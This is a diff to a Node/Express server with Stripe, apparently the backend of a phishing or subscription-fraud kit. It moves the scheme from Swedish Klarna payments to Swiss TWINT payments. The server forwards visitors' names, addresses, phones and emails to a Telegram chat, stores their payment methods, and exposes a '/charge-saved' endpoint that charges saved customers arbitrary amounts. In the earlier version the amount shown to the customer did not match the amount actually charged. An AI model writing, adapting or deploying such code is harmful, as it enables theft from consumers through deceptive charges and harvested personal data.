@@ -86,13 +86,13 @@ app.post('/create-setup-intent', async (req, res) => {
     } else {
       customer = await stripe.customers.create({
         email,
-        address: { country: 'SE' },
+        address: { country: 'CH' },
       });
     }
 
     const setupIntent = await stripe.setupIntents.create({
       customer: customer.id,
-      payment_method_types: ['klarna'],
+      payment_method_types: ['twint'],
       metadata: { customer_id: customer.id },
     });
 
@@ -103,7 +103,7 @@ app.post('/create-setup-intent', async (req, res) => {
       `👤 Namn: ${fname} ${lname}\n` +
       `📍 Adress: ${address}, ${zip} ${city}, ${country}\n` +
       `📞 Telefon: ${phone || 'N/A'}\n` +
-      `💰 Belopp: 1499 kr\n` +
+      `💰 Belopp: 10.90 CHF\n` +
       `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
     );
 
@@ -120,7 +120,7 @@ app.post('/payment-initiated', async (req, res) => {
     `💳 <b>Betalningsförsök startat!</b>\n\n` +
     `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
     `📧 E-post: ${email}\n` +
-    `⏳ Kunden har klickat på "Betala nu"\n` +
+    `⏳ Kunden har klickat på "Betala med TWINT"\n` +
     `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
   );
   res.json({ ok: true });
@@ -146,11 +146,11 @@ app.post('/create-subscription', async (req, res) => {
       savedAt: new Date().toISOString(),
     });
 
-    // Charge 1 — 9588 SEK
+    // Charge 1 — 10,90 CHF
     try {
       const payment1 = await stripe.paymentIntents.create({
-        amount: 958800,
-        currency: 'sek',
+        amount: 1090,
+        currency: 'chf',
         customer: customerId,
         payment_method: paymentMethodId,
         payment_method_types: [pmType],
@@ -179,7 +179,7 @@ app.post('/create-subscription', async (req, res) => {
       `✅ <b>Betalning lyckades!</b>\n\n` +
       `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
       `💳 Betalningsmetod: ${pmType}\n` +
-      `💳 Betalning 1: 9588 kr\n` +
+      `💳 Betalning 1: 10.90 CHF\n` +
       `🆔 Prenumeration: ${subscription.id}\n` +
       `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
     );
@@ -199,7 +199,7 @@ app.get('/customers', (req, res) => {
 
 // ─── Manually charge a saved customer ────────────────────────────────────────
 // POST /charge-saved
-// Body: { "customerId": "cus_xxx", "amount": 459900, "currency": "sek" }
+// Body: { "customerId": "cus_xxx", "amount": 1090, "currency": "chf" }
 app.post('/charge-saved', async (req, res) => {
   const { customerId, amount, currency } = req.body;
   const customers = loadCustomers();
@@ -211,8 +211,8 @@ app.post('/charge-saved', async (req, res) => {
 
   try {
     const payment = await stripe.paymentIntents.create({
-      amount: amount || 459900,
-      currency: currency || 'sek',
+      amount: amount || 1090,
+      currency: currency || 'chf',
       customer: customer.customerId,
       payment_method: customer.paymentMethodId,
       payment_method_types: [customer.pmType],
@@ -226,7 +226,7 @@ app.post('/charge-saved', async (req, res) => {
     await sendTelegram(
       `💰 <b>Manuell betalning!</b>\n\n` +
       `🆔 Kund: <code>${customerId}</code>\n` +
-      `💳 Belopp: ${(amount || 459900) / 100} kr\n` +
+      `💳 Belopp: ${(amount || 1090) / 100} CHF\n` +
       `📋 Status: ${payment.status}\n` +
       `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
     );
